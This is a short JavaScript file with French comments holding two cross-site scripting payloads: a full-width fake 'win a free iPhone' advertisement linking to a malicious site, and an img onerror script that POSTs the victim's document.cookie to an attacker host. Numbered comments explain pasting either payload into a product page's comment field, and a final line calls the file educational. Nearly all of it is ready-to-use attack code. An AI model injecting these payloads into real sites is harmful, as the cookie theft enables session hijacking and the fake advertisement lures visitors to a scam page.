// Script pour injecter une publicité malveillante
const xssAdPayload = `<div style="position:fixed; top:0; left:0; width:100%; background-color:red; color:white; padding:10px; z-index:9999; text-align:center;">
  PUBLICITÉ: Cliquez <a href="https://site-malveillant.example.com" style="color:yellow;">ici</a> pour gagner un iPhone gratuit!
</div>`;

// Script pour voler les cookies
const xssCookieStealerPayload = `<img src="x" onerror="
  fetch('https://attaquant-site.example.com/steal-cookie', {
    method: 'POST',
    body: JSON.stringify({cookies: document.cookie}),
    headers: {'Content-Type': 'application/json'}
  })
">`;

// Comment utiliser ces payloads:
// 1. Copiez l'un des payloads ci-dessus
// 2. Collez-le dans le champ de commentaire sur la page de détail du produit
// 3. Soumettez le formulaire
// 4. Observez l'effet sur la page

// Note: Dans un environnement réel, l'attaquant hébergerait un serveur pour recevoir les cookies volés
// Ce script est à des fins éducatives uniquement pour comprendre comment fonctionne une attaque XSS